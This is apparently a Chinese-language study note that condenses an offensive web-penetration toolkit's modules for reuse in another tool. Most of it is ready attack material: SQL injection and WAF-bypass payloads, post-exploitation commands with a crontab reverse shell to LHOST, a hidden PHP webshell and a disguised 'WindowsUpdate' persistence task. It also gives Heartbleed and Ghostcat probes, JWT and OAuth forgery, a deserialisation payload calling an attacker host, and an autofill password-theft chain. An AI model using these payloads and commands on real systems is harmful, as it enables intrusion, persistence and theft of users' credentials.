# Bingo Tools Round-2 — 补学文档 (sqli/post_exploit/ssl/ghostcat/js_secret/param/login/cloud/deser/graphql/autofill)

来源: bingo v7.0.66 tools/ 第二轮补学 17 模块。

## 1. SQLi — 3 次中位数采样 (sqli.py) ⭐⭐⭐

时间盲注判定: **3 次采样取中位数** (times.sort(); median=times[1]), 阈值 ≥2.8s 高置信 / ≥3.5s 更强。
单次测量易误报 — hunter 应升级为多次采样。

error-based 提取链: extractvalue(1,concat(0x7e,({query}),0x7e)) → 正则 `~(.+?)~` 提取 → updatexml fallback。

WAF bypass lambda 表: space(/**/,%0a,%09,+), keyword(SE/**/LECT, UN/**/ION, AN/**/D, O/**/R)。

## 2. Post Exploit — 后渗透命令表 (post_exploit.py) ⭐⭐⭐

exec_fn 注入解耦: SQLi/webshell/命令注入共用同一引擎。

```bash
# Recon
whoami; uname -a; ss -tlnp || netstat -tlnp; arp -a || cat /proc/net/arp
cat /etc/passwd | grep -v nologin | grep -v false
env | grep -iE 'pass|key|secret|token|db|api'
find / -name 'database.php' -o -name 'db.php' -o -name 'config.php' | xargs grep -l 'password'
# Privesc
find / -perm -4000   # SUID
getcap -r /          # capabilities
find / -writable -type d | grep -v proc
sudo -n true && echo 'SUDO_NOPASSWD'
ls /var/run/docker.sock && echo 'DOCKER_SOCKET_EXPOSED'
id | grep -q lxd && echo 'LXD_GROUP_MEMBER'
# Lateral
for i in $(seq 1 254); do (ping -c1 -W1 192.168.1.$i &>/dev/null && echo 192.168.1.$i) & done; wait
# Windows
cmdkey /list; reg query "HKLM\...\Winlogon"; reg save HKLM\SAM; schtasks /query /fo CSV
# Persistence
echo '* * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | crontab -
echo '<?php system($_GET["c"]); ?>' > /var/www/html/.cache.php
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\rev.exe" /sc onlogon /ru System
```

SUID 关注: python/bash/sh/vim/find/nmap/perl/ruby/php/curl/wget/cp/mv
Capability 关注: cap_setuid/cap_net_raw/cap_sys_admin
凭据提取正则: (?:password|passwd|pwd|secret|key|token)\s*[=:]\s*(\S+)

## 3. SSL Deep — Heartbleed 手工发包 PoC (ssl_deep_scanner.py) ⭐⭐⭐

纯 socket Heartbleed CVE-2014-0160 验证, 无需工具:
```
发送 TLS ClientHello → 等 ServerHelloDone(\x0e\x00\x00\x00) → 发恶意 heartbeat
(payload_length=16384) → 响应 resp[0]==0x18 即泄露 → 提取可打印内存
```
弱协议检测: TLSv1/TLSv1.1 钳制; OpenSSL 版本正则 r"OpenSSL/([\d.a-z]+)"。

## 4. Ghostcat — AJPv13 组包 (ghostcat_scanner.py) ⭐⭐⭐

hunter 无 Ghostcat 工具 — AJP 协议手工组包:
```python
AJP_MAGIC = b'\x12\x34'; CPING = b'\x12\x34\x00\x01\x0a'; CPONG = b'\x41\x42\x00\x01\x09'
# Forward Request: [magic][len][0x02][method=2 GET][protocol][req_uri][remote_addr][remote_host]
#   [server_name][port 80][is_ssl=0][num_headers=2][0xa00e Host][0xa00f UA][0xff]
探测: /WEB-INF/web.xml, /WEB-INF/web.XML, /%57EB-INF/web.xml (URL编码)
判定: 内容含 <web-app/<servlet/WEB-INF/<?xml
三级: 端口开=HIGH → CPong=CRITICAL → 文件读=CRITICAL
```

## 5. JS Secret Finder — 30 条密钥正则 (js_secret_finder.py) ⭐⭐⭐

hunter_js_* 无此完整表 — 直接可搬:
```python
aws_access_key:   r"AKIA[0-9A-Z]{16}"
aws_secret_key:   r"(?i)aws[_\-.]?secret[_\-.]?(?:access[_\-.]?)?key['\"\s:=]+([A-Za-z0-9/+=]{40})"
aws_session_token:r"AQoD[A-Za-z0-9/+=]{50,}"
google_api_key:   r"AIza[0-9A-Za-z\-_]{35}"
google_oauth:     r"[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com"
jwt_token:        r"eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_=]+\.?[A-Za-z0-9\-_.+/=]*"
jwt_secret:       r"(?i)jwt[_\-.]?secret['\"\s:=]+(['\"]?)([A-Za-z0-9@#$%^&*!_\-]{8,})\1"
api_key:          r"(?i)api[_\-.]?key['\"\s:=]+(['\"]?)([A-Za-z0-9\-_]{20,})\1"
bearer_token:     r"(?i)bearer\s+([A-Za-z0-9\-_=.]{20,})"
db_password:      r"(?i)(?:db|database)[_\-.]?pass(?:word)?['\"\s:=]+(['\"]?)([^\s'\"]{6,})\1"
mysql_uri:        r"mysql://[^'\"\s]+"  (postgres|mongodb|redis 同型)
rsa_private_key:  r"-----BEGIN (?:RSA )?PRIVATE KEY-----"  (EC/PGP 同)
stripe_secret:    r"sk_live_[0-9a-zA-Z]{24}"
sendgrid_key:     r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}"
twilio_sid:       r"AC[a-z0-9]{32}"
slack_token:      r"xox[baprs]-[0-9A-Za-z\-]{10,}"
github_token:     r"ghp_[A-Za-z0-9]{36}"  (gho_/glpat- 同)
korean_admin_key: r"(?i)관리자[_\-.]?(?:키|key|암호|패스)['\"\s:=]+([^\s'\"]{6,})"   ← 韩文专有
internal_api:     r"(?i)/(?:internal|private|secret|hidden|debug|dev)/[a-z0-9/_-]+"
```
JWT 命中自动三连: decode → alg:none 伪造(自动升 role/admin) → 弱 secret 爆破(14词)。

## 6. Param Discovery — 16 头绕过表 (param_discovery.py) ⭐⭐⭐

```
X-Forwarded-For:127.0.0.1 / X-Forwarded-Host:localhost / X-Forwarded-Proto:https
X-Original-URL:/admin / X-Rewrite-URL:/admin / X-Custom-IP-Authorization:127.0.0.1
X-Originating-IP / X-Remote-IP / X-Remote-Addr / X-Client-IP / X-Real-IP / True-Client-IP
Forwarded:for=127.0.0.1 / X-Host:localhost / X-Forwarded-Server:localhost / CF-Connecting-IP:127.0.0.1
判定: 403→200 即 HIGH
```
三源参数合并: 内置词表(~70词) + HTML input/查询串提取 + JS req|request|param 模式。

## 7. Login Executor — 4 级登录判定 (login_executor.py) ⭐⭐⭐

```
FAILED:   _FAIL_KEYWORDS 命中 (incorrect/invalid/wrong password/아이디 또는 비밀번호/로그인 실패/密码错误...)
VERIFIED: 成功关键词(logout/dashboard/mypage/관리자/welcome) 且 (有意义cookie 或 响应差>300B)
LIKELY:   仅关键词 或 仅 cookie+差>300B
INFERRED: 仅响应长度差>500B
有意义 cookie = 排除 _GENERIC_COOKIES (aspsessionid/phpsessid/jsessionid/_ga/_gid)
流程: 表单打分(password字段+10分) → 隐藏字段全保留 → 假凭据 baseline(BINGO_NO_SUCH_USER_xXx9)
     → 真实登录 → 成功后带 cookie 访问父目录验证 dashboard 正文
字段名: userid/user_id/username/login_id/id/email/uid/account/mb_id/아이디
        password/passwd/pass/pw/userpasswd/mb_password/비밀번호
```

## 8. Cloud Token Recon — 30 路径 (cloud_token_recon.py) ⭐⭐⭐

```
/_api/gcp-token /_api/token /api/cloud-token /internal/token /debug/token /health/token
/_aws/credentials /api/aws-token /api/azure-token /api/env /debug/env /secrets /api/secrets ...
TOKEN_PATTERNS: "access_token":"([^"]{50,})" (GCP)
  "AccessKeyId":"(ASIA|AKIA)[A-Z0-9]{16}"  "SecretAccessKey":"([^"]{40})"
  github_pat_[A-Za-z0-9_]{82}  vercel 24位
证据分级 VERIFIED/LIKELY/INFERRED; token 只存前 12 字符 preview (红线合规)
```

## 9. Deserialize — 5 语言特征表 (deserialize_tester.py) ⭐⭐⭐

```python
Java:   aced0005 / rO0AB → CVE-2015-4852, CVE-2017-10271
PHP:    r'O:\d+:' r'a:\d+:' r's:\d+:"' r'b:[01];' r'N;'
Python: r'\x80[\x02\x03\x04\x05]' r'cos\nsystem' r'csubprocess'
.NET:   /wEP /wEy __VIEWSTATE
AMF:    magic "00000000" + application/x-amf
ViewState MAC: base64 后 decoded[:2] in (b'\xff\x01', b'\xff\x03') = 无 MAC → ysoserial.net 候选
Java 错误基: rO0AB+\x00*20 + Content-Type: application/x-java-serialized-object
PHP canary: O:8:"stdClass":1:{s:4:"exec";s:9:"curl${IFS}http://canary.attacker.com/php";}
```

## 10. GraphQL Advanced ⭐⭐⭐

- 完整 introspection (含 includeDeprecated + 3 层 TypeRef)
- 批量登录绕过 rate limit: JSON 数组一个请求多组凭据
- 嵌套 DoS: "{ user { friends" + "} } "*depth + " { friends"*(depth-2) + close
- alias flood: f0: field...f100: field 单请求
- NoSQL payload: {"$gt":""}/{"$ne":null}/{"$where":"1==1"}/{"$regex":".*"}
- 字段爆破判定: "cannot query field"=不存在, 无 errors=存在
- IDOR 顺带要 password 字段: { q(id:uid){ id username email role password } }

## 11. Autofill Steal — CSP 环境密码窃取 (html_autofill_steal.py) ⭐⭐⭐

```
探测: <b>BINGO_PROBE</b>/<i>/<u> (无 JS 无弹窗, 规避 WAF)
Stage2: <meta name="referrer" content="unsafe-url"><meta http-equiv="Refresh" content="0,url={attacker}">
1-click 表单: <form action="/"><input type=email><input type=password><input name={param} value='{stage2}'>
  → 浏览器 autofill 自动填 → GET 提交 → 密码进 URL → meta refresh 带 Referer 外泄
CSP 判定: script-src 'none'/default-src 'none' = XSS 死路 → HTML 注入价值更高
Referrer-Policy: no-referrer/strict-origin/空 均可被 meta 覆盖
```

## 12. Nuclei Runner — 15 内置模板 (nuclei_runner.py) ⭐⭐

nuclei 未装时的纯 HTTP 兜底: springboot-actuator(/actuator/env) / .git/config / .env(DB_PASSWORD) /
wp-config.bak / jenkins 未授权 / kibana / redis(+PONG) / graphql introspection / swagger / aws 凭据 /
backup.zip / admin 面板 / CVE-2021-41773(/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd) /
Spring4Shell(?class.module.classLoader.resources.context.parent.pipeline.first.pattern=test)

## 13. Cloud Bucket ⭐⭐

桶名变体: {c}-assets/static/media/uploads/backup/db/data/dev/staging/prod/logs/archive + assets.{c} + 韩式 {c}-kr
三云 URL: S3 虚主机+路径+首尔区(s3.ap-northeast-2), GCS 两种, Azure ?restype=container&comp=list
列表判定: S3 <ListBucketResult / GCS "name": / Azure <Name>
敏感文件: .env|backup|.sql|.bak|.key|private.pem|credentials|secret|password|config.json|.aws|id_rsa|.pfx|.p12

## 14. OAuth Attacker ⭐⭐

forge_kid_sqli: kid="' UNION SELECT 'hacked'--" + HS256 用 b"hacked" 签名
forge_kid_path: kid="../../../dev/null" + 空密钥
forge_jwks: jku="http://attacker/jwks.json" + RS256
redirect 绕过: https://attacker.com%2Fcallback / https://attacker.com%23 / //attacker.com / /../../victim.com
state 检测: 缺失=MISSING_STATE, <8字符=WEAK_STATE; refresh_token 3 次连续成功=无限复用

## 15. Mobile Recon ⭐⭐

manifest 属性: debuggable/allowBackup(未声明=允许)/usesCleartextTraffic/exported
iOS: 无 PIE(otool -hv) / 无 stack canary(stack_chk_guard)
FIREBASE_API: AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}
SSL pinning 15 特征: CertificatePinner/TrustManagerImpl/checkServerTrusted/TrustKit/AFSSLPinningMode/SecTrustEvaluate
root 检测: RootBeer/Superuser.apk/sbin/su/Cydia/JailMonkey
apktool 不可用降级 zip 直读扫正则
